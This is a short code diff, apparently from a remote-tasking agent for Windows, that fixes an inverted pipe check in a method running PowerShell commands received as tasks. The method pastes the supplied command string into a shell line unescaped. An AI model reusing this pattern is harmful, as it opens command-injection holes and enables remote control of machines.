@@ -3,7 +3,6 @@
 #define _WIN32_WINNT 0x0600
 
 #include "Agent.h"
-
 #include <stdio.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -93,7 +92,7 @@ Response Agent::ExecutePowerShell(const int& taskID, const CommandPowershell& ps
     std::string result;
     std::string psCommand = "powershell.exe -Command \"" + psRequest.commandlet + "\"";
     FILE* pipe = _popen(psCommand.c_str(), "r");
-    if (pipe)
+    if (!pipe)
     {
         return CreateTaskResponse(taskID, POWERSHELL, NO_CODE, TASK_ERROR, TaskError{ 0, "Failed to open process pipe." });
     }
